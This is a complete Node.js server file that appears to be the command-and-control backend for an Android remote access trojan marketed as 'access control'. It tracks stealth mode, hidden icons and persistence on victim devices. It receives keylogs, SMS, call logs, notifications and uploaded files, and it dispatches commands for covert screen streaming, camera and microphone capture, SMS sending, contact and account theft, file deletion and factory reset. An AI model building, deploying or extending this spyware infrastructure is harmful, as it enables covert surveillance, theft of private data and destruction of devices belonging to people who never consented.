// ============================================
// ULTIMATE ACCESS CONTROL BACKEND - COMPLETE WORKING CODE
// Advanced Remote Device Management Level
// ============================================

const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const mongoose = require('mongoose');
const Redis = require('ioredis');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const crypto = require('crypto');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const winston = require('winston');
const Bull = require('bull');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

// ============================================
// CONFIGURATION
// ============================================

const config = {
    PORT: process.env.PORT || 5000,
    MONGODB_URI: process.env.MONGODB_URI || process.env.MONGODB_URL || 'mongodb://localhost:27017/ultimate-access-control',
    REDIS_URL: process.env.REDIS_URL,
    REDIS_HOST: process.env.REDIS_HOST || 'localhost',
    REDIS_PORT: process.env.REDIS_PORT || 6379,
    JWT_SECRET: process.env.JWT_SECRET || 'your-super-secret-jwt-key-change-this',
    JWT_REFRESH_SECRET: process.env.JWT_REFRESH_SECRET || 'your-refresh-secret-key',
    ENCRYPTION_KEY: process.env.ENCRYPTION_KEY || crypto.randomBytes(32),
    UPLOAD_DIR: process.env.UPLOAD_DIR || './uploads'
};

// ============================================
// LOGGER SETUP
// ============================================

const logger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.json()
    ),
    transports: [
        new winston.transports.File({ filename: 'error.log', level: 'error' }),
        new winston.transports.File({ filename: 'combined.log' }),
        new winston.transports.Console({
            format: winston.format.simple()
        })
    ]
});

// ============================================
// ENCRYPTION SERVICE
// ============================================

class EncryptionService {
    constructor() {
        this.algorithm = 'aes-256-gcm';
        this.key = config.ENCRYPTION_KEY;
    }

    encrypt(data) {
        try {
            const iv = crypto.randomBytes(16);
            const cipher = crypto.createCipheriv(this.algorithm, this.key, iv);
            
            let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
            encrypted += cipher.final('hex');
            
            const authTag = cipher.getAuthTag();
            
            return {
                encrypted,
                iv: iv.toString('hex'),
                authTag: authTag.toString('hex')
            };
        } catch (error) {
            logger.error('Encryption error:', error);
            throw error;
        }
    }

    decrypt(encryptedData, iv, authTag) {
        try {
            const decipher = crypto.createDecipheriv(
                this.algorithm,
                this.key,
                Buffer.from(iv, 'hex')
            );
            
            decipher.setAuthTag(Buffer.from(authTag, 'hex'));
            
            let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
            decrypted += decipher.final('utf8');
            
            return JSON.parse(decrypted);
        } catch (error) {
            logger.error('Decryption error:', error);
            throw error;
        }
    }
}

const encryptionService = new EncryptionService();

// ============================================
// MONGODB SCHEMAS
// ============================================

// User Schema
const userSchema = new mongoose.Schema({
    userId: { type: String, required: true, unique: true },
    email: { type: String, required: true, unique: true },
    password: { type: String, required: true },
    role: { type: String, enum: ['admin', 'user'], default: 'user' },
    license: {
        plan: { type: String, enum: ['free', 'basic', 'premium', 'enterprise'], default: 'free' },
        devices: { type: Number, default: 1 },
        validUntil: { type: Date },
        active: { type: Boolean, default: true }
    },
    apiKey: { type: String },
    createdAt: { type: Date, default: Date.now },
    lastLogin: { type: Date }
});

// Device Schema
const deviceSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, unique: true },
    userId: { type: String, required: true, ref: 'User' },
    deviceInfo: {
        model: String,
        manufacturer: String,
        androidVersion: String,
        sdkVersion: Number,
        imei: String,
        phoneNumber: String,
        simOperator: String,
        batteryLevel: Number,
        isCharging: Boolean,
        networkType: String,
        ipAddress: String,
        macAddress: String
    },
    location: {
        latitude: Number,
        longitude: Number,
        accuracy: Number,
        lastUpdated: Date
    },
    status: {
        online: { type: Boolean, default: false },
        lastSeen: Date,
        connectedAt: Date,
        socketId: String
    },
    permissions: {
        accessibility: { type: Boolean, default: false },
        deviceAdmin: { type: Boolean, default: false },
        notification: { type: Boolean, default: false },
        overlay: { type: Boolean, default: false },
        storage: { type: Boolean, default: false },
        camera: { type: Boolean, default: false },
        microphone: { type: Boolean, default: false },
        location: { type: Boolean, default: false },
        sms: { type: Boolean, default: false },
        contacts: { type: Boolean, default: false },
        callLogs: { type: Boolean, default: false }
    },
    settings: {
        iconHidden: { type: Boolean, default: false },
        appName: String,
        persistenceEnabled: { type: Boolean, default: false },
        stealthMode: { type: Boolean, default: false }
    },
    createdAt: { type: Date, default: Date.now }
});

// Command Schema
const commandSchema = new mongoose.Schema({
    commandId: { type: String, required: true, unique: true },
    deviceId: { type: String, required: true, ref: 'Device' },
    userId: { type: String, required: true, ref: 'User' },
    command: { type: String, required: true },
    data: mongoose.Schema.Types.Mixed,
    status: { type: String, enum: ['pending', 'executing', 'success', 'failed'], default: 'pending' },
    response: mongoose.Schema.Types.Mixed,
    error: String,
    sentAt: { type: Date, default: Date.now },
    executedAt: Date,
    completedAt: Date
});

// File Schema
const fileSchema = new mongoose.Schema({
    fileId: { type: String, required: true, unique: true },
    deviceId: { type: String, required: true, ref: 'Device' },
    userId: { type: String, required: true, ref: 'User' },
    fileName: String,
    filePath: String,
    fileSize: Number,
    fileType: String,
    category: { type: String, enum: ['photo', 'video', 'audio', 'document', 'apk', 'other'] },
    uploadedAt: { type: Date, default: Date.now },
    storageUrl: String
});

// Log Schema
const logSchema = new mongoose.Schema({
    logId: { type: String, required: true, unique: true },
    deviceId: { type: String, required: true, ref: 'Device' },
    userId: { type: String, required: true, ref: 'User' },
    logType: { type: String, enum: ['keylog', 'sms', 'call', 'notification', 'location', 'app', 'other'] },
    data: mongoose.Schema.Types.Mixed,
    timestamp: { type: Date, default: Date.now }
});

// Create Models
const User = mongoose.model('User', userSchema);
const Device = mongoose.model('Device', deviceSchema);
const Command = mongoose.model('Command', commandSchema);
const File = mongoose.model('File', fileSchema);
const Log = mongoose.model('Log', logSchema);

// ============================================
// EXPRESS APP SETUP
// ============================================

const app = express();
const server = http.createServer(app);

// Middleware
app.use(helmet());
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100 // limit each IP to 100 requests per windowMs
});
app.use('/api/', limiter);

// Static files
app.use(express.static(path.join(__dirname, '../frontend')));
app.use('/uploads', express.static(config.UPLOAD_DIR));

// File upload
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const uploadPath = path.join(config.UPLOAD_DIR, req.body.deviceId || 'temp');
        if (!fs.existsSync(uploadPath)) {
            fs.mkdirSync(uploadPath, { recursive: true });
        }
        cb(null, uploadPath);
    },
    filename: (req, file, cb) => {
        cb(null, Date.now() + '-' + file.originalname);
    }
});

const upload = multer({ 
    storage,
    limits: { fileSize: 100 * 1024 * 1024 } // 100MB
});

// ============================================
// SOCKET.IO SETUP
// ============================================

const io = socketIO(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    maxHttpBufferSize: 50e6 // 50MB
});

// ============================================
// REDIS SETUP
// ============================================

const redisClient = config.REDIS_URL 
    ? new Redis(config.REDIS_URL)
    : new Redis({
        host: config.REDIS_HOST,
        port: config.REDIS_PORT
    });

redisClient.on('error', (err) => logger.error('Redis error:', err));
redisClient.on('connect', () => logger.info('Redis connected'));

// ============================================
// BULL QUEUE SETUP
// ============================================

const commandQueue = new Bull('commands', {
    redis: config.REDIS_URL || {
        host: config.REDIS_HOST,
        port: config.REDIS_PORT
    }
});

commandQueue.process(async (job) => {
    const { deviceId, command, data } = job.data;
    logger.info(`Processing command: ${command} for device: ${deviceId}`);
    
    try {
        const device = await Device.findOne({ deviceId });
        if (!device || !device.status.online) {
            throw new Error('Device offline or not found');
        }

        // Send command via Socket.IO
        io.to(device.status.socketId).emit('command:execute', {
            commandId: job.id,
            command,
            data
        });

        return { success: true, commandId: job.id };
    } catch (error) {
        logger.error('Command processing error:', error);
        throw error;
    }
});

// ============================================
// JWT AUTHENTICATION
// ============================================

function generateToken(userId, role) {
    return jwt.sign({ userId, role }, config.JWT_SECRET, { expiresIn: '24h' });
}

function generateRefreshToken(userId) {
    return jwt.sign({ userId }, config.JWT_REFRESH_SECRET, { expiresIn: '7d' });
}

function verifyToken(token) {
    try {
        return jwt.verify(token, config.JWT_SECRET);
    } catch (error) {
        return null;
    }
}

// Auth middleware
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (!token) {
        return res.status(401).json({ error: 'Access token required' });
    }

    const decoded = verifyToken(token);
    if (!decoded) {
        return res.status(403).json({ error: 'Invalid or expired token' });
    }

    req.user = decoded;
    next();
};

// Socket authentication
const authenticateSocket = async (socket, next) => {
    try {
        const token = socket.handshake.auth.token;
        if (!token) {
            return next(new Error('Authentication token required'));
        }

        const decoded = verifyToken(token);
        if (!decoded) {
            return next(new Error('Invalid or expired token'));
        }

        socket.userId = decoded.userId;
        socket.role = decoded.role;
        next();
    } catch (error) {
        next(new Error('Authentication failed'));
    }
};

// ============================================
// REST API ENDPOINTS
// ============================================

// User Registration
app.post('/api/auth/register', async (req, res) => {
    try {
        const { email, password } = req.body;

        // Check if user exists
        const existingUser = await User.findOne({ email });
        if (existingUser) {
            return res.status(400).json({ error: 'User already exists' });
        }

        // Hash password
        const hashedPassword = await bcrypt.hash(password, 10);

        // Create user
        const userId = crypto.randomBytes(16).toString('hex');
        const apiKey = crypto.randomBytes(32).toString('hex');

        const user = new User({
            userId,
            email,
            password: hashedPassword,
            apiKey,
            license: {
                plan: 'free',
                devices: 1,
                validUntil: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000), // 7 days
                active: true
            }
        });

        await user.save();

        // Generate tokens
        const token = generateToken(userId, user.role);
        const refreshToken = generateRefreshToken(userId);

        logger.info(`User registered: ${email}`);

        res.json({
            success: true,
            userId,
            email,
            token,
            refreshToken,
            apiKey,
            license: user.license
        });
    } catch (error) {
        logger.error('Registration error:', error);
        res.status(500).json({ error: 'Registration failed' });
    }
});

// User Login
app.post('/api/auth/login', async (req, res) => {
    try {
        const { email, password } = req.body;

        // Find user
        const user = await User.findOne({ email });
        if (!user) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }

        // Verify password
        const validPassword = await bcrypt.compare(password, user.password);
        if (!validPassword) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }

        // Update last login
        user.lastLogin = new Date();
        await user.save();

        // Generate tokens
        const token = generateToken(user.userId, user.role);
        const refreshToken = generateRefreshToken(user.userId);

        logger.info(`User logged in: ${email}`);

        res.json({
            success: true,
            userId: user.userId,
            email: user.email,
            role: user.role,
            token,
            refreshToken,
            apiKey: user.apiKey,
            license: user.license
        });
    } catch (error) {
        logger.error('Login error:', error);
        res.status(500).json({ error: 'Login failed' });
    }
});

// Get Devices
app.get('/api/devices', authenticateToken, async (req, res) => {
    try {
        const devices = await Device.find({ userId: req.user.userId });
        res.json({ success: true, devices });
    } catch (error) {
        logger.error('Get devices error:', error);
        res.status(500).json({ error: 'Failed to get devices' });
    }
});

// Get Device Info
app.get('/api/devices/:deviceId', authenticateToken, async (req, res) => {
    try {
        const device = await Device.findOne({ 
            deviceId: req.params.deviceId,
            userId: req.user.userId 
        });

        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }

        res.json({ success: true, device });
    } catch (error) {
        logger.error('Get device error:', error);
        res.status(500).json({ error: 'Failed to get device' });
    }
});

// Send Command
app.post('/api/commands', authenticateToken, async (req, res) => {
    try {
        const { deviceId, command, data } = req.body;

        // Verify device ownership
        const device = await Device.findOne({ 
            deviceId,
            userId: req.user.userId 
        });

        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }

        // Create command
        const commandId = crypto.randomBytes(16).toString('hex');
        const cmd = new Command({
            commandId,
            deviceId,
            userId: req.user.userId,
            command,
            data
        });

        await cmd.save();

        // Add to queue
        await commandQueue.add({
            deviceId,
            command,
            data
        }, {
            jobId: commandId,
            attempts: 3,
            backoff: {
                type: 'exponential',
                delay: 2000
            }
        });

        logger.info(`Command sent: ${command} to device: ${deviceId}`);

        res.json({ success: true, commandId });
    } catch (error) {
        logger.error('Send command error:', error);
        res.status(500).json({ error: 'Failed to send command' });
    }
});

// Get Command Status
app.get('/api/commands/:commandId', authenticateToken, async (req, res) => {
    try {
        const command = await Command.findOne({ 
            commandId: req.params.commandId,
            userId: req.user.userId 
        });

        if (!command) {
            return res.status(404).json({ error: 'Command not found' });
        }

        res.json({ success: true, command });
    } catch (error) {
        logger.error('Get command error:', error);
        res.status(500).json({ error: 'Failed to get command' });
    }
});

// Upload File
app.post('/api/files/upload', authenticateToken, upload.single('file'), async (req, res) => {
    try {
        const { deviceId, category } = req.body;
        const file = req.file;

        if (!file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }

        // Create file record
        const fileId = crypto.randomBytes(16).toString('hex');
        const fileRecord = new File({
            fileId,
            deviceId,
            userId: req.user.userId,
            fileName: file.originalname,
            filePath: file.path,
            fileSize: file.size,
            fileType: file.mimetype,
            category: category || 'other',
            storageUrl: `/uploads/${deviceId}/${file.filename}`
        });

        await fileRecord.save();

        logger.info(`File uploaded: ${file.originalname} from device: ${deviceId}`);

        res.json({ 
            success: true, 
            fileId,
            fileName: file.originalname,
            fileSize: file.size,
            storageUrl: fileRecord.storageUrl
        });
    } catch (error) {
        logger.error('File upload error:', error);
        res.status(500).json({ error: 'File upload failed' });
    }
});

// Get Files
app.get('/api/files', authenticateToken, async (req, res) => {
    try {
        const { deviceId, category } = req.query;
        
        const query = { userId: req.user.userId };
        if (deviceId) query.deviceId = deviceId;
        if (category) query.category = category;

        const files = await File.find(query).sort({ uploadedAt: -1 });

        res.json({ success: true, files });
    } catch (error) {
        logger.error('Get files error:', error);
        res.status(500).json({ error: 'Failed to get files' });
    }
});

// Get Logs
app.get('/api/logs', authenticateToken, async (req, res) => {
    try {
        const { deviceId, logType, limit = 100 } = req.query;
        
        const query = { userId: req.user.userId };
        if (deviceId) query.deviceId = deviceId;
        if (logType) query.logType = logType;

        const logs = await Log.find(query)
            .sort({ timestamp: -1 })
            .limit(parseInt(limit));

        res.json({ success: true, logs });
    } catch (error) {
        logger.error('Get logs error:', error);
        res.status(500).json({ error: 'Failed to get logs' });
    }
});

// Health Check
app.get('/api/health', (req, res) => {
    res.json({
        status: 'ok',
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

// ============================================
// SOCKET.IO HANDLERS
// ============================================

io.use(authenticateSocket);

// ============================================
// COMMAND DISPATCH TABLE
// ============================================
const COMMAND_TYPES = {
    // Screen
    capture_screen: 'screen',
    start_stream: 'screen',
    stop_stream: 'screen',
    // Location
    get_location: 'location',
    start_location_tracking: 'location',
    stop_location_tracking: 'location',
    // Camera
    capture_photo: 'camera',
    record_video: 'camera',
    // Microphone
    start_audio_recording: 'audio',
    stop_audio_recording: 'audio',
    // SMS / Calls
    send_sms: 'sms',
    get_sms: 'sms',
    make_call: 'call',
    get_call_logs: 'call',
    // Files
    list_files: 'files',
    download_file: 'files',
    delete_file: 'files',
    // Device control
    vibrate: 'control',
    flash: 'control',
    toast: 'control',
    notification: 'control',
    volume_up: 'control',
    volume_down: 'control',
    wifi_on: 'control',
    wifi_off: 'control',
    bluetooth_on: 'control',
    bluetooth_off: 'control',
    lock_screen: 'control',
    restart: 'control',
    // Data
    get_contacts: 'data',
    get_apps: 'data',
    get_accounts: 'data',
    clipboard: 'data',
    device_info: 'data',
    installed_apps: 'data',
    uninstall_app: 'data',
    factory_reset: 'data',
    keylog: 'data'
};

io.on('connection', async (socket) => {
    logger.info(`Socket connected: ${socket.id} (User: ${socket.userId})`);

    // Dashboard client joins user room on connect
    socket.join(`user:${socket.userId}`);

    // Send current device list to newly connected dashboard
    const userDevices = await Device.find({ userId: socket.userId }).catch(() => []);
    socket.emit('device:list', userDevices);

    // Dashboard: request current device list
    socket.on('dashboard:get_devices', async () => {
        try {
            const devices = await Device.find({ userId: socket.userId });
            socket.emit('device:list', devices);
        } catch (error) {
            logger.error('Get devices socket error:', error);
        }
    });

    // Dashboard: send command to a device
    socket.on('command:send', async (data) => {
        try {
            const { deviceId, command, payload } = data;

            const device = await Device.findOne({ deviceId, userId: socket.userId });
            if (!device) {
                return socket.emit('command:error', { message: 'Device not found or not authorized' });
            }

            const commandId = crypto.randomBytes(16).toString('hex');
            const cmd = new Command({
                commandId,
                deviceId,
                userId: socket.userId,
                command,
                data: payload || null,
                status: 'pending'
            });
            await cmd.save();

            const category = COMMAND_TYPES[command] || 'other';

            if (device.status && device.status.online && device.status.socketId) {
                io.to(device.status.socketId).emit('command:execute', {
                    commandId,
                    command,
                    category,
                    data: payload || null
                });
                cmd.status = 'executing';
                cmd.executedAt = new Date();
                await cmd.save();

                socket.emit('command:sent', { commandId, command, status: 'executing', deviceId });
                logger.info(`[command:send] ${command} → device ${deviceId}`);
            } else {
                cmd.status = 'failed';
                cmd.error = 'Device offline';
                await cmd.save();
                socket.emit('command:error', { message: 'Device is offline', commandId });
            }
        } catch (error) {
            logger.error('command:send error:', error);
            socket.emit('command:error', { message: 'Failed to send command' });
        }
    });

    // Device Registration
    socket.on('device:register', async (data) => {
        try {
            const { deviceId, deviceInfo } = data;

            // Find or create device
            let device = await Device.findOne({ deviceId });

            if (!device) {
                device = new Device({
                    deviceId,
                    userId: socket.userId,
                    deviceInfo,
                    status: {
                        online: true,
                        connectedAt: new Date(),
                        lastSeen: new Date(),
                        socketId: socket.id
                    }
                });
            } else {
                device.status.online = true;
                device.status.connectedAt = new Date();
                device.status.lastSeen = new Date();
                device.status.socketId = socket.id;
                device.deviceInfo = { ...device.deviceInfo, ...deviceInfo };
            }

            await device.save();

            // Join device room
            socket.join(`device:${deviceId}`);
            socket.join(`user:${socket.userId}`);

            logger.info(`Device registered: ${deviceId}`);

            // Notify user
            io.to(`user:${socket.userId}`).emit('device:connected', {
                deviceId,
                deviceInfo: device.deviceInfo,
                status: device.status
            });

            socket.emit('device:registered', { 
                success: true, 
                deviceId,
                message: 'Device registered successfully'
            });

            // Broadcast updated device list to all dashboard clients for this user
            const updatedDevices = await Device.find({ userId: socket.userId });
            io.to(`user:${socket.userId}`).emit('device:list', updatedDevices);
        } catch (error) {
            logger.error('Device registration error:', error);
            socket.emit('error', { message: 'Device registration failed' });
        }
    });

    // Command Response
    socket.on('command:response', async (data) => {
        try {
            const { commandId, response, error } = data;

            const command = await Command.findOne({ commandId });
            if (!command) {
                return socket.emit('error', { message: 'Command not found' });
            }

            command.status = error ? 'failed' : 'success';
            command.response = response;
            command.error = error;
            command.completedAt = new Date();

            await command.save();

            // Notify user
            io.to(`user:${command.userId}`).emit('command:result', {
                commandId,
                command: command.command,
                response,
                error,
                status: command.status
            });

            logger.info(`Command completed: ${commandId}`);
        } catch (error) {
            logger.error('Command response error:', error);
        }
    });

    // File Upload from Device
    socket.on('file:upload', async (data) => {
        try {
            const { deviceId, fileName, fileData, fileType, category } = data;

            // Save file
            const uploadPath = path.join(config.UPLOAD_DIR, deviceId);
            if (!fs.existsSync(uploadPath)) {
                fs.mkdirSync(uploadPath, { recursive: true });
            }

            const filePath = path.join(uploadPath, fileName);
            const buffer = Buffer.from(fileData, 'base64');
            fs.writeFileSync(filePath, buffer);

            // Create file record
            const fileId = crypto.randomBytes(16).toString('hex');
            const fileRecord = new File({
                fileId,
                deviceId,
                userId: socket.userId,
                fileName,
                filePath,
                fileSize: buffer.length,
                fileType,
                category: category || 'other',
                storageUrl: `/uploads/${deviceId}/${fileName}`
            });

            await fileRecord.save();

            // Notify user
            io.to(`user:${socket.userId}`).emit('file:received', {
                fileId,
                deviceId,
                fileName,
                fileSize: buffer.length,
                storageUrl: fileRecord.storageUrl
            });

            logger.info(`File uploaded: ${fileName} from device: ${deviceId}`);
        } catch (error) {
            logger.error('File upload error:', error);
        }
    });

    // Log Data
    socket.on('log:data', async (data) => {
        try {
            const { deviceId, logType, logData } = data;

            const logId = crypto.randomBytes(16).toString('hex');
            const log = new Log({
                logId,
                deviceId,
                userId: socket.userId,
                logType,
                data: logData
            });

            await log.save();

            // Notify user
            io.to(`user:${socket.userId}`).emit('log:received', {
                logId,
                deviceId,
                logType,
                data: logData,
                timestamp: log.timestamp
            });

            logger.info(`Log received: ${logType} from device: ${deviceId}`);
        } catch (error) {
            logger.error('Log data error:', error);
        }
    });

    // Stream Data (Screen, Camera, etc.)
    socket.on('stream:data', async (data) => {
        try {
            const { deviceId, streamType, streamData } = data;

            // Forward to user
            io.to(`user:${socket.userId}`).emit('stream:update', {
                deviceId,
                streamType,
                data: streamData,
                timestamp: new Date()
            });
        } catch (error) {
            logger.error('Stream data error:', error);
        }
    });

    // Device Heartbeat
    socket.on('device:heartbeat', async (data) => {
        try {
            const { deviceId, deviceInfo } = data;

            await Device.updateOne(
                { deviceId },
                { 
                    $set: { 
                        'status.lastSeen': new Date(),
                        deviceInfo: deviceInfo
                    }
                }
            );
        } catch (error) {
            logger.error('Heartbeat error:', error);
        }
    });

    // Disconnect
    socket.on('disconnect', async () => {
        try {
            await Device.updateMany(
                { 'status.socketId': socket.id },
                { 
                    $set: { 
                        'status.online': false,
                        'status.lastSeen': new Date()
                    }
                }
            );

            // Broadcast updated list so dashboards refresh
            const updatedDevices = await Device.find({ userId: socket.userId });
            io.to(`user:${socket.userId}`).emit('device:list', updatedDevices);

            logger.info(`Socket disconnected: ${socket.id}`);
        } catch (error) {
            logger.error('Disconnect error:', error);
        }
    });
});

// ============================================
// DATABASE CONNECTION
// ============================================

mongoose.connect(config.MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
})
.then(() => {
    logger.info('MongoDB connected');
})
.catch((error) => {
    logger.error('MongoDB connection error:', error);
    process.exit(1);
});

// ============================================
// START SERVER
// ============================================

server.listen(config.PORT, () => {
    logger.info(`🚀 Server running on port ${config.PORT}`);
    logger.info(`📱 Device endpoint: http://localhost:${config.PORT}`);
    logger.info(`💻 Admin panel: http://localhost:${config.PORT}`);
    logger.info(`🔥 ULTIMATE ACCESS CONTROL SYSTEM - Advanced Device Management`);
});

// ============================================
// CLEANUP
// ============================================

// Cleanup old commands every hour
setInterval(async () => {
    try {
        const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);
        await Command.deleteMany({ 
            completedAt: { $lt: oneHourAgo }
        });
        logger.info('Old commands cleaned up');
    } catch (error) {
        logger.error('Cleanup error:', error);
    }
}, 60 * 60 * 1000);

// Graceful shutdown
process.on('SIGTERM', () => {
    logger.info('SIGTERM received, shutting down gracefully');
    server.close(() => {
        logger.info('Server closed');
        mongoose.connection.close(false, () => {
            logger.info('MongoDB connection closed');
            process.exit(0);
        });
    });
});

module.exports = { app, server, io };
